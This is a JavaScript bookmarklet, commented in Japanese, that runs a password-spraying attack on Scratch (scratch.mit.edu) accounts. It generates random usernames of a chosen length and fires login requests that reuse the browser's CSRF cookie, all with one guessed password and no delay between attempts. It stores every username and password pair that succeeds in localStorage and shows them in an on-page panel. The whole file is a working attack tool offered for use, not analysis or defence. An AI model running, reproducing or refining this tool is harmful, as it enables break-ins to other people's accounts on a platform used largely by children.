javascript:(function(){
try{
  const used = new Set();
  const STORAGE_KEY = "scratch_brute_success";

  // 過去の成功結果を取得
  function getSavedResults() {
    const data = localStorage.getItem(STORAGE_KEY);
    return data ? JSON.parse(data) : [];
  }

  // 成功結果を保存
  function saveResult(username, password) {
    const results = getSavedResults();
    // 重複チェック
    if (!results.some(r => r.username === username)) {
      results.push({
        username: username,
        password: password,
        time: new Date().toLocaleString('ja-JP')
      });
      localStorage.setItem(STORAGE_KEY, JSON.stringify(results));
      return true;
    }
    return false;
  }

  function g(n){
    var m = document.cookie.match(new RegExp("(?:^|; )"+n+"=([^;]*)"));
    return m ? decodeURIComponent(m[1]) : null;
  }

  function r(l, opts, must){
    let c = "";
    if(opts.includeLetters) c += "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    if(opts.includeSymbols) c += "_-";
    if(opts.includeNumbers)  c += "0123456789";
    if(!c) throw new Error("文字種が選択されていません");

    let s = must || "";
    while(s.length < l) s += c.charAt(Math.floor(Math.random()*c.length));
    s = s.split("").sort(() => Math.random() - 0.5).join("");

    if(used.has(s)) return null;
    used.add(s);
    return s;
  }

  async function login(u, p){
    try{
      const res = await fetch("https://scratch.mit.edu/accounts/login/", {
        method: "POST",
        credentials: "include",
        headers: {
          "x-csrftoken": g("scratchcsrftoken") || "a",
          "x-requested-with": "XMLHttpRequest",
          "content-type": "application/json",
          "accept": "application/json"
        },
        body: JSON.stringify({
          username: u,
          password: p,
          useMessages: true
        })
      });

      if(res.status === 200){
        const saved = saveResult(u, p);
        log("lime", `成功: ${u}`);
        if (saved) {
          log("#00ffaa", `→ 保存しました (${u})`);
        } else {
          log("yellow", `→ すでに保存済み (${u})`);
        }
        return true;
      }
      return false;
    }catch(e){
      return false;
    }
  }

  function log(color, msg){
    let d = document.getElementById("loginLogDiv");
    if(!d){
      d = document.createElement("div");
      d.id = "loginLogDiv";
      Object.assign(d.style, {
        position: "fixed",
        top: "10px",
        right: "10px",
        width: "340px",
        maxHeight: "80vh",
        overflowY: "auto",
        background: "rgba(0,0,0,0.88)",
        color: "white",
        border: "1px solid #444",
        zIndex: 999999,
        fontSize: "13px",
        padding: "10px",
        fontFamily: "Consolas, monospace",
        borderRadius: "6px",
        boxShadow: "0 2px 10px rgba(0,0,0,0.5)"
      });

      // STOPボタン
      let stopBtn = document.createElement("button");
      stopBtn.textContent = "STOP";
      stopBtn.style.cssText = "width:100%; padding:8px; margin-bottom:8px; background:#c00; color:white; border:none; border-radius:4px; cursor:pointer;";
      stopBtn.onclick = () => {
        clearInterval(window.loginTimer);
        log("orange", "停止しました");
      };
      d.appendChild(stopBtn);

      // 保存済み結果表示ボタン
      let showBtn = document.createElement("button");
      showBtn.textContent = "保存済み結果を表示";
      showBtn.style.cssText = "width:100%; padding:8px; margin-bottom:8px; background:#0066cc; color:white; border:none; border-radius:4px; cursor:pointer;";
      showBtn.onclick = () => {
        const results = getSavedResults();
        if (results.length === 0) {
          log("silver", "保存された結果はありません");
          return;
        }
        log("cyan", "──── 保存済み結果 ──────");
        results.forEach((r, i) => {
          log("white", `[${i+1}] ${r.time}`);
          log("#88ff88", `ユーザー: ${r.username}`);
          log("#ffcc88", `パスワード: ${r.password}`);
          log("gray", "──────────────────────");
        });
      };
      d.appendChild(showBtn);

      document.body.appendChild(d);
    }

    let line = document.createElement("div");
    line.style.color = color;
    line.textContent = msg;
    d.appendChild(line);
    d.scrollTop = d.scrollHeight;
  }

  (async function(){
    const len = parseInt(prompt("生成する文字数","3"), 10);
    if(!len || isNaN(len)) return;

    let must = prompt("必ず含める文字（なしなら空欄やNO）","");
    if(must === "NO" || must === "no") must = "";

    const includeLetters  = prompt("英字を含める？ (1=はい)", "1") === "1";
    const includeSymbols  = prompt("_-を含める？ (1=はい)", "1") === "1";
    const includeNumbers  = prompt("数字を含める？ (1=はい)", "1") === "1";

    const pass = prompt("試すパスワードを入力");
    if(!pass) return;

    const opts = { includeLetters, includeSymbols, includeNumbers };

    log("white", "開始しました  (成功したら自動保存されます)");

    window.loginTimer = setInterval(async () => {
      let user;
      do {
        user = r(len, opts, must);
      } while(!user);

      await login(user, pass);
    }, 0);

  })();
}catch(e){
  alert("エラー: " + e.message);
}})();
